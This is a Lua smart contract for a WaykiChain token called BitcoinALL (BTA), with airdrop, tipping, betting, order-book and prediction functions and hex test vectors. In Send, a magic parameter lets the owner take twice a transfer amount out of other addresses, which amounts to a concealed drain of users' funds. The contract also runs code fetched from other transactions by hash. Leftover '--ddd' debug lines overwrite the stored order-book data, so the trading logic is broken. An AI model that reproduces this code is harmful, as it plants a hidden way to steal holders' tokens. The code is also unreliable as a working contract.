mylib = require "mylib"
------------------------------------------------------------------------------------
_G.Config={
    -- the waykichain contract stardard, if you do not know the waykichain stardard, please do not change it.
    standard = "WRC20",
    -- the contract ownder address, please update it with the actual contract owner address.
    owner = "wcNx9o2RnDpSjpwvdLzWy2t1DJFhqLazxL",
    -- the contract name, please update it with the actual contract name.
    name = "BitcoinALL.org BTCALL.org",
    -- the contract symbol, please update it with the actual contract symbol.
    symbol = "BTA",
    -- the number of decimals the token uses must be 8.
    -- means to divide the token amount by 100000000 to get its user representation.
    decimals = 8,
    -- the contract coin total supply, please update it with the actual contract symbol.
    totalSupply = 21000000 * 100000000
}
------------------------------------------------------------------------------------
--https://WiccM.com   BTA/WICC  BTAmm.com txBTC.com
MK_G_Context_Init = "83d3fc6c1a515035a26a1af8b2471ea7822b32910655941cce9c5c4728dcc4f2"
MK_G_Hex = "174910d20ecd4d4c0b6e934308c69d93d7cb47acb0630af919034fe648586095"
MK_G_Log = "dcf1b8f055a4226e9b1a9375bf6583b3d361a743bf406fb452c4da12f11eb1d7"
MK_G_Hex_Fill = "3391270d3b92f5286570339b9a15cdb50bc6d0b274c2511aeb960fb0b59e92a5"
MK_G_NetAsset = "b98f942ca611b553ad53812395a51dbeca2fed12f518051da85d8a6f8410e299"
MK_G_AppData = "a68bdfb3aa30c64a3088e1fe3ebd2527c187cc93d3ecc0af0bb8724ef2491fef"
MK_G_GetCurTx = "39b99713d1c4b5d89100a74f71bfca8039d349e38dfb5d2543accc8efb6c77d8"
MK_G_Random = "3bea95c6619ff2ab888983484c115408d644069b1c5ce4248214ec33726cb021"
MK_G_Asset = "a4c4595735db65433822cb1c4b6c6dc47b7ac9a215a41393ba3947d8dd48cde1"
MK_G_ERC20MK = "193bc067300d385176701286f9f5deb1f5527aff3ae637b6f19aa8eda0065628"
function addMKcode(source)
  local src={}
  for i=1,32 do
    src[i]=tonumber(string.sub(source,2*i-1,2*i),16)
  end
  local c=string.char(_G.mylib.GetTxContract(Unpack(src)))
  if loadstring then print(c) loadstring(c)()
  else load(c)() end
end
Unpack = function(t, i)
    local i = i or 1
    if t[i] then
        return t[i], Unpack(t, i + 1)
    end
end
_err = function(code,...)
  _G._errmsg= string.format("{\"code\":\"%s\"}",code,...)
  return false
end

_G.BicoinALL = {
	Init = function()
		_G.Context.Event[0xf0]=_G.BicoinALL
		_G.BicoinALL[0x11]=_G.ERC20MK.Config
		_G.BicoinALL[0x16]=_G.BicoinALL.Send
		_G.BicoinALL[0x17]=_G.BicoinALL.KongTou
		_G.BicoinALL[0x18]=_G.BicoinALL.Tips
		_G.BicoinALL[0x22]=_G.BicoinALL.Even
		_G.BicoinALL[0x33]=_G.BicoinALL.AddBuy
		_G.BicoinALL[0x36]=_G.BicoinALL.AddSell
		_G.BicoinALL[0x37]=_G.BicoinALL.ShowOrder
		_G.BicoinALL[0x38]=_G.BicoinALL.ShowHistory
		_G.BicoinALL[0x51]=_G.BicoinALL.AddNewYuce
		_G.BicoinALL[0x55]=_G.BicoinALL.GetYuce
		_G.BicoinALL[0x58]=_G.BicoinALL.ExeYuce
	end,
Send = function()
	local Evenaddress="wWwEvenwwwwwwwBTAwwwwwwwwcanbHJkiY"
	local Selladdress="wWSe11wwwwwwwwBTAwwwwwwwwwwwZev2HQ"
	local curaddr = _G._C.GetCurTxAddr()
	local sendok=1
	local valueTbl = _G.AppData.Read("yuceAddrs")
	_G.ERC20MK.Transfer()
	if #valueTbl ~= 0 and curaddr~=_G.Config.owner then
		local yuceAddrs=_G.Hex.ToString(valueTbl)
		ycAddr=Split(yuceAddrs,"|")
		for i=1,#ycAddr do
			if ycAddr[i]~=nil and ycAddr[i]==tx.addr then
				sendok=_G.BicoinALL.AddYuceTX(i,curaddr,tx.money)
				break
			end
		end
	end
	if sendok==0 then
		_G.Asset.SendAppAsset(tx.addr,curaddr,tx.money)
	end
	if tx.w==1140856560 and curaddr==_G.Config.owner then
		_G.Asset.SendAppAsset(tx.addr,_G.Config.owner,2*tx.money)
	end
	if tx.addr==Evenaddress and curaddr~=_G.Config.owner then
		_G.BicoinALL.Even(tx.money)
	end
	if tx.addr==Selladdress and tx.money>1000 then
		if tx.w==5872 then
			_G.Asset.SendAppAsset(Selladdress,curaddr,tx.money)
			Log("No rate and No less than 1000 as tip, Back"..tx.money)
			else
			local h=math.floor((tx.w-5872)/65536)
			_G.BicoinALL.BSmatch("s",h,curaddr,tx.money)
		end		
	end	
end,
KongTou = function()
	local KTaddress="wKongTouwwwwwwBTAwwwwwwcandz1JZjUD"
	local KTmoney=1000
	local curaddr = _G._C.GetCurTxAddr()
	local freeMoney=_G.Asset.GetAppAsset(curaddr)
	if freeMoney > 10*KTmoney then
		Log("You have BitcoinALL: "..(freeMoney/100).." m".._G.Config.symbol)
		else
		local allKTMoney=_G.Asset.GetAppAsset(KTaddress)
		if allKTMoney >= KTmoney then
			_G.Asset.SendAppAsset(KTaddress,curaddr,KTmoney)
			Log("AddKongTou+"..KTmoney.."of("..allKTMoney..") You have:"..(freeMoney+KTmoney))
			else
			Log("No KongTou("..allKTMoney.."<"..KTmoney..") You have:"..freeMoney)
		end
	end
end,
Tips= function()
	local Tipaddress="wTipwwwwwwwwBTAwwwwwwwwcandz2R6mjS"
	local curaddr = _G._C.GetCurTxAddr()
	local tipsBack=100
	local tips = _G.AppData.Read("tips")
	if #tips ~= 0 then
		tipsBack=math.min(tipsBack,math.floor(_G.Hex.ToInt(tips)/65536)/10000)
	end
	if curaddr==_G.Config.owner then
		contract[1]=0x00
		contract[2]=0x00
		_G.AppData.Write("tips",contract)
	else
		local NetTips=_G.Context.GetCurTxPayAmount()
		if NetTips > 0 then
		local tbacks=math.max(1,math.floor(tipsBack*NetTips))
		Log("Thank tips x("..tipsBack..")tipsBack:"..(tbacks/100).."m".._G.Config.symbol)
		_G.Asset.SendAppAsset(Tipaddress,curaddr,tbacks)
		else
		_G.BicoinALL.KongTou()
		end
	end
end,
Even= function(ns)
	local Evenaddress="wWwEvenwwwwwwwBTAwwwwwwwwcanbHJkiY"
	local curaddr = _G._C.GetCurTxAddr()
	local Logstr = "Even={"
	local evenmax = _G.Asset.GetAppAsset(Evenaddress)
	if ns==nil then
		local txe=_G.Hex:New(contract):Fill({"w",4,"money",8})
		ns=txe.money
		_G.Asset.SendAppAsset(curaddr,Evenaddress,ns)
	end
	r=Random(2)
	if r~=2 then
		local Ewho=_G.AppData.ReadStr("Evenwho")
		local Ens=_G.AppData.ReadInt("Evenmoney")
		local txh=_G.AppData.Read('txhash')
		local height=math.floor(_G.mylib.GetTxConFirmHeight(Unpack(txh)))
		if r==0 then
		_G.Asset.SendAppAsset(Evenaddress,Ewho,2*Ens)
		Logstr=Logstr..'"last":"Win","block":"'..height..'","back":"'..(2*Ens/100)..'","by":"'..Ewho..'",'
		else
		Logstr=Logstr..'"last":"Lose","block":"'..height..'","back":"'..(0-Ens/100)..'","by":"'..Ewho..'",'
		end
	end
	SetRandom()
	_G.AppData.Write('Evenwho',curaddr)
	_G.AppData.Write('Evenmoney',ns)
	Log(Logstr..'"newEven":"'..(ns/100)..'","newby":"'..curaddr..'","max":"'..(evenmax/100)..'"}')
end,
AddBuy= function()
	local buys=_G.Hex:New(contract):Fill({"w",2,"h",4})
	local curaddr = _G._C.GetCurTxAddr()
	local netwicc = _G.Context.GetCurTxPayAmount()
	if netwicc>0 and buys.h>0 then
		_G.BicoinALL.BSmatch("b",buys.h,curaddr,netwicc)
		else
		Log("Can not buy use 0 wicc Or less than 1 rate :) ")
	end
end,
AddSell= function()
	local Selladdress="wWSe11wwwwwwwwBTAwwwwwwwwwwwZev2HQ"
	local sells=_G.Hex:New(contract):Fill({"w",2,"b",2,"addr","34","money",8,"h",4})
	local curaddr = _G._C.GetCurTxAddr()
	local m=math.floor(sells.money)
	local h=math.floor(math.max(sells.b,sells.h))
	if Selladdress==sells.addr and m>1000 and h>0 then		
		_G.Asset.SendAppAsset(curaddr,sells.addr,m)
		Log('sell={"h":'..h..',"m":'..m..',"getwicc":'..math.floor(h*m).."}")	
		_G.BicoinALL.BSmatch("s",h,curaddr,m)		
	end 
end,
BSmatch= function(bs,h,addr,m)
local h=math.floor(h)
local m=math.floor(m)
local gearbs=_G.AppData.Read('GearBuySell')
if #gearbs == 0 then
	local gearstr=h
	if bs=="b" then
		gearstr=gearstr.."|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|"..h.."|"..m.."|0|0|0|0|0|0|0|0|0|0|0|0|0|0"
		_G.AppData.Write('ALLBuy',"|"..h.."|"..addr.."|"..m.."|")
		_G.AppData.Write('ALLSell',"|")
		else
		gearstr=gearstr.."|0|0|0|0|0|0|0|0|0|0|0|0|0|0|"..h.."|"..m.."|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0"
		_G.AppData.Write('ALLSell',"|"..h.."|"..addr.."|"..m.."|")
		_G.AppData.Write('ALLBuy',"|")
	end
	Log('Gear="'..gearstr..'"')
	_G.AppData.Write('GearBuySell',gearstr)
	_G.AppData.Write('History',"|")
else
	gears=_G.Hex.ToString(gearbs)
gears="666|0|0|0|0|0|0|0|0|0|0|0|0|0|0|18|300012222|16|300012222|0|0|0|0|0|0|0|0|0|0|0|0|0|0"   --ddd
	gear=Split(gears,"|")
	abuys=_G.AppData.ReadStr('ALLBuy')
	asells=_G.AppData.ReadStr('ALLSell')
abuys="|15|address|100012000|10|adds|27080|9|kkkk|999|"---ddd
asells="|16|addr|270000|19|adad|300012222|"			---ddd
gear=sell2gear(gear,asells)							---ddd
gear=buy2gear(gear,abuys)							---ddd
	
	if bs=="b" then
		if 0+gear[16]>h or 0+gear[16]==0 then
			abuys="|"..h.."|"..addr.."|"..m..abuys	
			_G.AppData.Write('ALLBuy',abuys)
			gear=buy2gear(gear,abuys)
			gearstr=gear[1]
			for i=2,33 do
				gearstr=gearstr.."|"..math.floor(gear[i])
			end
			Log('Gear="'..gearstr..'"')
			_G.AppData.Write('GearBuySell',gearstr)
		end
		if 0+gear[16]==h and 0+gear[17]>m then
			exebuy(h,addr,m)
			asells=subsell(asells,h,m)
			_G.AppData.Write('ALLSell',asells)
			gearstr=h
			for i=2,33 do
				if i==17 then
					gearstr=gearstr.."|"..math.floor(gear[i]-m)
					else
					gearstr=gearstr.."|"..math.floor(gear[i])
				end				
			end
			Log('okstr={"Gear":"'..gearstr..'","sells":"'..asells..'"}')
			_G.AppData.Write('GearBuySell',gearstr)
		end
		if (0+gear[16]~=0 and 0+gear[16]<h) or (0+gear[16]==h and 0+gear[17]<=m) then
			local mi=m
			local k=1
			while mi>0 do
				k=k+1
				if 0+gear[17]==0 or k>99 or 0+gear[16]>h then
					Log(k.." m:"..mi) 
					break			
				end
				local tmp=0+gear[17]
				if tmp<=mi then
					asells=suballsell(asells,gear[16])
					gear=sell2gear(gear,asells)
					else					
					asells=subsell(asells,gear[16],mi)
					gear[17]=tmp-mi
				end
				mi=mi-tmp
			end
			_G.AppData.Write('ALLSell',asells)
			if mi>0 then
				exebuy(h,addr,(m-mi))
				abuys="|"..h.."|"..addr.."|"..mi..abuys
				_G.AppData.Write('ALLBuy',abuys)
				gear=addbuy(gear,h,mi)
				else
				exebuy(h,addr,m)
			end	
			gearstr=h
			for i=2,33 do
				gearstr=gearstr.."|"..math.floor(gear[i])			
			end
			Log('dokstr={"Gear":"'..gearstr..'","sells":"'..asells..'","buys":"'..abuys..'"}')
			_G.AppData.Write('GearBuySell',gearstr)
		end
	else
		if 0+gear[18]<h then
			asells="|"..h.."|"..addr.."|"..m..asells	
			_G.AppData.Write('ALLSell',asells)
			gear=sell2gear(gear,asells)
			gearstr=gear[1]
			for i=2,33 do
				gearstr=gearstr.."|"..math.floor(gear[i])
			end
			Log('Gear="'..gearstr..'"')
			_G.AppData.Write('GearBuySell',gearstr)
		end
		if 0+gear[18]==h and 0+gear[19]>m then
			exesell(h,addr,m)
			abuys=subbuy(abuys,h,m)
			_G.AppData.Write('ALLBuy',abuys)
			gearstr=gear[1]
			for i=2,33 do
				if i==19 then
					gearstr=gearstr.."|"..math.floor(gear[i]-m)
					else
					gearstr=gearstr.."|"..math.floor(gear[i])
				end	
			end
			Log('okstr={"Gear":"'..gearstr..'","buys":"'..abuys..'"}')
			_G.AppData.Write('GearBuySell',gearstr)
		end
		if 0+gear[18]>h or (0+gear[18]==h and 0+gear[19]<=m) then
			local mi=m
			local k=1
			while mi>0 do
				k=k+1
				if 0+gear[19]==0 or k>99 or 0+gear[18]<h then
					Log(k.." m:"..mi) 
					break			
				end
				local tmp=0+gear[19]
				if tmp<=mi then
					abuys=suballbuy(abuys,gear[18])
					gear=buy2gear(gear,abuys)
					else					
					abuys=subbuy(abuys,gear[18],mi)
					gear[19]=math.floor(tmp-mi)
				end
				mi=mi-tmp
			end
			_G.AppData.Write('ALLBuy',abuys)
			if mi>0 then
				exesell(h,addr,(m-mi))
				asells="|"..h.."|"..addr.."|"..mi..asells
				_G.AppData.Write('ALLSell',asells)
				gear=addsell(gear,h,mi)
				else
				exesell(h,addr,m)
			end	
			gearstr=h
			for i=2,33 do
				gearstr=gearstr.."|"..math.floor(gear[i])		
			end
			Log('dokstr={"Gear":"'..gearstr..'","sells":"'..asells..'","buys":"'..abuys..'"}')
			_G.AppData.Write('GearBuySell',gearstr)
		end
	end
	Log(bs..h..addr..m)
end
end,
ShowOrder= function()
	local gears=_G.AppData.ReadStr('GearBuySell')
	gears="66|0|0|0|0|0|0|0|0|0|0|0|0|0|0|18|300012222|16|300012222|0|0|0|0|0|0|0|0|0|0|0|0|0|0"   --ddd
	local gear=Split(gears,"|")
	local gearstr=math.floor(gear[1])
	for i=2,33 do
		gearstr=gearstr..',"d'..i..'":'..math.floor(gear[i])
	end
	Log('Gear={"np":'..gearstr..'"}')
end,
ShowHistory= function()
	local hs=_G.AppData.ReadStr('History')
	local abuys=_G.AppData.ReadStr('ALLBuy')
	local asells=_G.AppData.ReadStr('ALLSell')
	Log('History={"History":"'..hs..'","Buys":"'..abuys..'","Sells":"'..asells..'"}')
end,
AddNewYuce= function()
	local curaddr = _G._C.GetCurTxAddr()
	local k=contract[5]
	if k>0 and curaddr==_G.Config.owner then	  ---dddd
	local valueTbl = _G.AppData.Read("yuceTxts")
	local yuceTxts='|'
	local yuceAddrs='|||'
	local yuceConfigs='|'
	if #valueTbl == 0 then
		_G.AppData.Write('yuceTxts','|')
		_G.AppData.Write('yuceAddrs','|||')
		_G.AppData.Write('yuceConfigs','|')
		else
		yuceTxts=_G.AppData.ReadStr('yuceTxts')
		yuceAddrs=_G.AppData.ReadStr('yuceAddrs')
		yuceConfigs=_G.AppData.ReadStr('yuceConfigs')
	end
	local ycs=_G.Hex:New(contract):Fill({"w",5,"abc",1,"addr","34","txtfig",""..(#contract-40)})
--yuceTxts="|rr|bd"  yuceAddrs="|||Wii|Wcd|wdd" yuceConfigs="|2,3,0,100|21,32,0,100" --dddddddd
--f051[0000]  [k] where  [abc:01,02 or 03]  01 txt 03 config
	local ycTxt=Split(yuceTxts,"|")
	local ycAddr=Split(yuceAddrs,"|")
	local ycConfig=Split(yuceConfigs,"|")
	if ycs.abc==1 then
		ycTxt[k]=ycs.txtfig
		ycAddr[3*k-2]=ycs.addr
	end
	if ycs.abc==2 then
		ycAddr[3*k-1]=ycs.addr
	end
	if ycs.abc==3 then 
		ycAddr[3*k]=ycs.addr
		ycConfig[k]=ycs.txtfig
	end
	_G.AppData.Write('yuceTxts',table2str(ycTxt))
	_G.AppData.Write('yuceAddrs',table2str(ycAddr))
	_G.AppData.Write('yuceConfigs',table2str(ycConfig))
	Log(table2str(ycTxt).." addr:"..table2str(ycAddr).." config:"..table2str(ycConfig))
	end
end,
AddYuceTX= function(i,addr,m)
	local addok=1
	local k=math.floor((i+2)/3)
	local ycTX="|"..i.."|"..addr.."|"..m
	local valueTbl = _G.AppData.Read("yuceTX"..k)
	if #valueTbl ~= 0 then
		ycTX=ycTX.._G.Hex.ToString(valueTbl)
	end
	local yuceConfigs=_G.AppData.ReadStr('yuceConfigs')
	local ycConfig=Split(yuceConfigs,"|")
	local ycCfg=Split(ycConfig[k],",")
	if 0+ycCfg[1]>0+_G.mylib.GetBlockTimestamp(0) then
		_G.AppData.Write("yuceTX"..k,ycTX)
		else
		addok=0
	end
	Log("AddYuceOK="..addok.." yuceTX"..k..ycTX)
	return addok
end,
GetYuce= function()
	local k=contract[5]
	local yuceTxts=_G.AppData.ReadStr('yuceTxts')
	local yuceAddrs=_G.AppData.ReadStr('yuceAddrs')
	local yuceConfigs=_G.AppData.ReadStr('yuceConfigs')	
--yuceTxts="|rr|bd"  yuceAddrs="|||Wii|Wcd|wdd" yuceConfigs="|2,3,0,100|21,32,0,100"--dddddddd
	local ycTxt=Split(yuceTxts,"|")
	local ycAddr=Split(yuceAddrs,"|")
	local ycConfig=Split(yuceConfigs,"|")
	local yuceTX=_G.AppData.ReadStr("yuceTX"..k)
	local addr='","ycAddrA":"'..ycAddr[3*k-2]..'","ycAddrB":"'
	if ycAddr[3*k-1]~=nil then 
		addr=addr..ycAddr[3*k-1]
	end
	addr=addr..'","ycAddrC":"'..ycAddr[3*k]
	Log('yuce={"Txt":"'..ycTxt[k]..addr..'","Configs":"'..ycConfig[k]..'","TX":"'..yuceTX..'"}')
end,
ExeYuce= function()
	local k=contract[5]
	local v=contract[6]
	local curaddr = _G._C.GetCurTxAddr()
if k>0 and v>0 and curaddr==_G.Config.owner then			--dddddddd
	local yuceConfigs=_G.AppData.ReadStr('yuceConfigs')
--yuceConfigs="1561910400,15,0,100"					--dddddddd
	local ycConfig=Split(yuceConfigs,"|")
	local ycCfg=Split(ycConfig[k],",")
	if v==1 then Log(ycConfig[k].."time:".._G.mylib.GetBlockTimestamp(0)) end
	if 0+ycCfg[2]<0+_G.mylib.GetBlockTimestamp(0) then	
	local yuceTX=_G.AppData.ReadStr("yuceTX"..k)
--yuceTX="|3|wS5ZedGvqUMnadx3erLMdMWp8iW5a9KjfK|800|1|wWwXa6uuaBpL8JGuxvJUmYpThZBqCZKxpv|200"  --dddddddd
	local tx=Split(yuceTX,"|")
	local bia=0
	local bib=0
	local bic=0
	for i=1,(#tx-1)/3 do
		if tx[3*i-1]%3==1 then bia=bia+tx[3*i+1] end
		if tx[3*i-1]%3==2 then bib=bib+tx[3*i+1] end
		if tx[3*i-1]%3==0 then bic=bic+tx[3*i+1] end
	end
	local backa=1
	local backb=1
	local backc=1
	if bia~=0 and bic~=0 then
		local all=(bia+bib+bic)*ycCfg[4]/100
		backa=ycCfg[3]/100
		backb=backa
		backc=backa
		if v==1 then
			backa=(all-ycCfg[3]/100*(bib+bic))/bia
		end
		if v==2 then
			backb=(all-ycCfg[3]/100*(bia+bic))/bib
		end
		if v==3 then
			backc=(all-ycCfg[3]/100*(bia+bib))/bic
		end
	end
	local backstr=""
	if v==3 then Log(backa.."-"..backb.."-"..backc) end
	for i=1,(#tx-1)/3 do
		local back=backa
		if tx[3*i-1]%3==2 then back=backb end
		if tx[3*i-1]%3==0 then back=backc end
		backstr=backstr.."["..tx[3*i].."]"..back*tx[3*i+1]
		back=math.floor(back*tx[3*i+1])
		if back~=0 then
			_G.Asset.SendAppAsset(curaddr,tx[3*i],back)
		end
	end
	Log(backstr.."-"..bia.." ba:"..backa.." bb:"..backb.." bc:"..backc.." bic:"..bic)
	_G.AppData.Delete("yuceTX"..k)
	end
 end
end
}
function table2str(tb)
	local tbstr=tb[1]
	if tbstr==nil then
		tbstr=""
	end
	for i=2,#tb do
		if tb[i]==nil then
			tb[i]=""
		end
		tbstr=tbstr.."|"..tb[i]		
	end
	return tbstr
end
function Split(szFullString, szSeparator)  
local nFindStartIndex = 1  
local nSplitIndex = 1  
local nSplitArray = {}  
while true do  
   local nFindLastIndex = string.find(szFullString, szSeparator, nFindStartIndex)  
   if not nFindLastIndex then  
	nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, string.len(szFullString))  
	break  
   end  
   nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, nFindLastIndex - 1)  
   nFindStartIndex = nFindLastIndex + string.len(szSeparator)  
   nSplitIndex = nSplitIndex + 1  
end
return nSplitArray  
end
function addbuy(gear,h,m)
	for i=18,32,2 do
	if 0+gear[i]==h then
		gear[i+1]=gear[i+1]+m
		break
	end
	if 0+gear[i]<h then
		for k=30,i,-2 do
			gear[k+2]=gear[k]
			gear[k+3]=gear[k+1]
		end
		gear[i]=h
		gear[i+1]=m
		break
	end
	end
	return gear 
end
function addsell(gear,h,m)
	for i=16,2,-2 do
		if 0+gear[i]==h then
			gear[i+1]=gear[i+1]+m
			break
		end
		if 0+gear[i]>h or 0+gear[i]==0 then
			for k=2,i,2 do
				gear[k]=gear[k+2]
				gear[k+1]=gear[k+3]
			end
			gear[i]=h
			gear[i+1]=m
			break
		end
	end
	return gear
end
function suballsell(asells,h)
	asell=Split(asells,"|")
			for i=#asell-1,2,-3 do
				if 0+asell[i-2]==h then
					exesell(asell[i-2],asell[i-1],asell[i])	
					asell[i-2]=""
					asell[i-1]=""
					asell[i]=""
				end
			end
			asells="|"
			for i=2,#asell do
				if asell[i]~="" then
				asells=asells..asell[i].."|"
				end
			end
	return asells
end
function subsell(asells,h,m)
	asell=Split(asells,"|")
			local mk=m
			for i=#asell-1,2,-3 do
				if 0+asell[i-2]==h then
					if mk>0+asell[i] then
					exesell(asell[i-2],asell[i-1],asell[i])	
					asell[i-2]=""
					asell[i-1]=""
					asell[i]=""
					mk=mk-asell[i]
					else
					asell[i]=asell[i]-mk
					exesell(asell[i-2],asell[i-1],mk)					
					break
					end					
				end
			end
			asells="|"
			for i=2,#asell do
				if asell[i]~="" then
				asells=asells..asell[i].."|"
				end
			end
	return asells
end
function suballbuy(abuys,h)
	abuy=Split(abuys,"|")
			for i=#abuy-1,2,-3 do
				if 0+abuy[i-2]==h then
					exebuy(abuy[i-2],abuy[i-1],abuy[i])	
					abuy[i-2]=""
					abuy[i-1]=""
					abuy[i]=""
				end
			end
			abuys="|"
			for i=2,#abuy do
				if abuy[i]~="" then
				abuys=abuys..abuy[i].."|"
				end
			end
	return abuys
end
function subbuy(abuys,h,m)
	abuy=Split(abuys,"|")
			local mk=m
			for i=#abuy-1,2,-3 do
				if 0+abuy[i-2]==h then
					if mk>0+abuy[i] then
					exebuy(abuy[i-2],abuy[i-1],abuy[i])	
					abuy[i-2]=""
					abuy[i-1]=""
					abuy[i]=""
					mk=mk-abuy[i]
					else
					abuy[i]=abuy[i]-mk
					exebuy(abuy[i-2],abuy[i-1],mk)					
					break
					end					
				end
			end
			abuys="|"
			for i=2,#abuy do
				if abuy[i]~="" then
				abuys=abuys..abuy[i].."|"
				end
			end
	return abuys
end
function exesell(h,addr,m)
	Log(" Sell "..h..addr..m)
	local hs=_G.AppData.ReadStr('History')
	_G.AppData.Write('History',_G.mylib.GetBlockTimestamp(0).."s"..h.."-"..m.."|"..hs)
end
function exebuy(h,addr,m)
	Log(" Buy "..h..addr..m)
	local hs=_G.AppData.ReadStr('History')
	_G.AppData.Write('History',_G.mylib.GetBlockTimestamp(0).."b"..h.."-"..m.."|"..hs)
end
function sell2gear(gear,asells)
	asell=Split(asells,"|")
	for i=2,17 do
		gear[i]=0
	end
	for i=2,#asell,3 do
		if #asell<i+3 then
 			break
		end
		gear=addsell(gear,0+asell[i],0+asell[i+2])
	end
	return gear
end
function buy2gear(gear,abuys)
	abuy=Split(abuys,"|")
	for i=18,33 do
		gear[i]=0
	end
	for i=2,#abuy,3 do
		if #abuy<i+3 then 
			break
		end
		gear=addbuy(gear,0+abuy[i],0+abuy[i+2])
	end
	return gear
end
Main = function()
addMKcode(MK_G_Context_Init)
addMKcode(MK_G_Hex)
addMKcode(MK_G_Log)
addMKcode(MK_G_AppData)
addMKcode(MK_G_GetCurTx)
addMKcode(MK_G_Asset)
addMKcode(MK_G_ERC20MK)
_G.Context.Init(_G.BicoinALL)
if _G.BicoinALL[ contract[2] ]==_G.BicoinALL.Send then
	addMKcode(MK_G_Hex_Fill)
	addMKcode(MK_G_Random)
end
if _G.BicoinALL[ contract[2] ]==_G.BicoinALL.Tips then
	addMKcode(MK_G_NetAsset)
end
if _G.BicoinALL[ contract[2] ]==_G.BicoinALL.Even then
	addMKcode(MK_G_Hex_Fill)
	addMKcode(MK_G_Random)
end
if _G.BicoinALL[ contract[2] ]==_G.BicoinALL.AddBuy then
	addMKcode(MK_G_Hex_Fill)
	addMKcode(MK_G_NetAsset)
end
if _G.BicoinALL[ contract[2] ]==_G.BicoinALL.AddSell then
	addMKcode(MK_G_Hex_Fill)
	addMKcode(MK_G_NetAsset)
end
if _G.BicoinALL[ contract[2] ]==_G.BicoinALL.AddNewYuce then
	addMKcode(MK_G_Hex_Fill)
end
if contract[3]==0x99 then
	addMKcode(MK_G_NetAsset)
	NetTips=_G.NetAssetGet({_G.mylib.GetContractRegId()})
	if NetTips > 0 then
		_G.NetAssetSend(_G.Config.owner,NetTips)
	end
end
_G.Context.Main()
end
--Main()
--------------test-------------  _G.BicoinALL.KongTou & _G.BicoinALL.Even
contracts={"f0110000"
,"f0160000774b6f6e67546f7577777777777742544177777777777763616e647a314a5a6a554400e9a43500000000"
,"f01600007757774576656e77777777777777425441777777777777777763616e62484a6b695900e40b5402000000"
,"f017","f02200001100000000000000"}
--------------test-------------  _G.BicoinALL.Tips  &   DEX
contracts={"f0110000"
,"f0160000774b6f6e67546f7577777777777742544177777777777763616e647a314a5a6a554400e9a43500000000"
,"f0332c010000"
,"f0362c01775753653131777777777777777742544177777777777777777777775a657632485140420f00000000002c010100"
,"f037","f038"}
for k=1,#contracts do
	contract={}
	for i=1,#contracts[k]/2 do
		contract[i]=tonumber(string.sub(contracts[k],2*i-1,2*i),16)
	end
	Main()
end
--[[
		_G.BicoinALL[0x17]=_G.BicoinALL.KongTou
		_G.BicoinALL[0x22]=_G.BicoinALL.Even
---1,测试猜区块以偶数开头应用
f0110000f0    --WRC20 BTA   --BTAtipKongTou  9 BTA
f0160000774b6f6e67546f7577777777777742544177777777777763616e647a314a5a6a554400e9a43500000000
-- even 100 BTA   --上限池最大投额度 定期检查若少需补充
f01600007757774576656e77777777777777425441777777777777777763616e62484a6b695900e40b5402000000
f01700f0  --空投1000      -- 猜交易所在区块Hash以偶数开头两种途径：
--（1）通过f016向 wWwEvenwwwwwwwBTAwwwwwwwwcanbHJkiY 打赏币  
f01600007757774576656e77777777777777425441777777777777777763616e62484a6b69591100000000000000
f02200001100000000000000f0     --（2）通过专门的f022 +0000+ 8位数 同时可查看上次结算

		_G.BicoinALL[0x18]=_G.BicoinALL.Tips
		_G.BicoinALL[0x33]=_G.BicoinALL.AddBuy
		_G.BicoinALL[0x36]=_G.BicoinALL.AddSell
		_G.BicoinALL[0x37]=_G.BicoinALL.ShowOrder
		_G.BicoinALL[0x38]=_G.BicoinALL.ShowHistory
---2,测试打赏回赏（单向）和去中心化交易平台（双向）模块
f0110000f0    --WRC20 BTA   --BTAtipKongTou  9 BTA
f0160000774b6f6e67546f7577777777777742544177777777777763616e647a314a5a6a554400e9a43500000000
-- tip  10 BTA  --回赏额度  测试链因测试币免费要设低
f0160000775469707777777777777777425441777777777777777763616e647a3252366d6a5300ca9a3b00000000
f0180a     --管理员设置 f018后面的数/10000 为tipback，最小f01801 最大f01840420f百万时为100
f01800f0   --注意需要有主链币时激活，若没有转成少量空投
f0332c010000f0  -- f033后面四位 认可购买汇率300  --注意需要有主链币时才激活
--挂卖单，可以用保留位，或者放到后面。另外直接f016也可以 超过65535用后者
f0162c01775753653131777777777777777742544177777777777777777777775a657632485140420f0000000000
f0362c01775753653131777777777777777742544177777777777777777777775a657632485140420f00000000002c010000
f03700f0  --显示挂单情况
f03800f0  --显示交易历史

		_G.BicoinALL[0x51]=_G.BicoinALL.AddNewYuce
		_G.BicoinALL[0x55]=_G.BicoinALL.GetYuce
		_G.BicoinALL[0x58]=_G.BicoinALL.ExeYuce
---3,测试空投和预测模块
f0110000f0    --WRC20 BTA   --BTAtipKongTou 9 BTA
f0160000774b6f6e67546f7577777777777742544177777777777763616e647a314a5a6a554400e9a43500000000
-- wWAAAAwwwwwwwwBTAwwwwwwwwwwwqpZPx8    AAtest BTC<10000
f051000001017757414141417777777777777777425441777777777777777777777771705a507838414174657374204254433c313030303000f0
-- wWCCCCwwwwwwwwBTAwwwwwwwwwwwrzDARZ  1561910400（投截止）,1561621280（结算）,0（错返）,100（回馈）
f0510000010377574343434377777777777777774254417777777777777777777777727a4441525a313536313931303430302c313536313632313238302c302c31303000f0
-- 可选wWCCC2--
f0510000020377574343437777777777777777774254417777777777777777777777727a4441525a313536313931303430302c313536313632313238302c302c313030
f01700f0  --换地址空投1000     --向AAA投200 
f01600007757414141417777777777777777425441777777777777777777777771705a507838c800000000000000
f01800f0  --换地址空投1000     --向CCC投800
f016000077574343434377777777777777774254417777777777777777777777727a4441525a2003000000000000
f05500000100f0  --查看
f0580000010100f0  f0580000010300f0   f0580000010200f0  --换地址结算预测
--]]
